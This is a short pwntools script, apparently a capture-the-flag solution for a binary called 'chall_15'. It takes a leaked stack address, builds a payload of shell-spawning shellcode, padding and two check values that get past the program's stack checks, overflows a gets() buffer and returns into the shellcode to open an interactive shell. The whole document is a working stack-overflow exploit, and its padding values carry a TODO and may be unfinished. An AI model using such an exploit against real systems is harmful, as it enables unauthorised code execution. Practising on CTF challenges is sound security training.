import pwn

pwn.context.arch = 'amd64'
elf = pwn.context.binary = pwn.ELF("./chall_15")

p = pwn.process(elf.path)
shellcode = pwn.asm(pwn.shellcraft.sh())

p.recvuntil(b"Sometimes the canary is in the coal mine, sometimes the canary is on the stack, and sometimes ... baked beans\n")
addr = p.recv()
addr = pwn.p64(int(addr, 16))

# values being checked in vuln
checkval_a = pwn.p32(0xb16b00b5) # var uint64_t var_ch @ stack - 0xc
checkval_b = pwn.p32(0xdeadd00d) # var uint64_t var_10h @ stack - 0x10

# size of gets buffer
offset = 8 # var char *s @ stack - 0x128
extra = 232 # TODO
payload = shellcode + b"A"*extra + checkval_b + checkval_a + b"A"*offset + addr


p.sendline(payload)

p.interactive()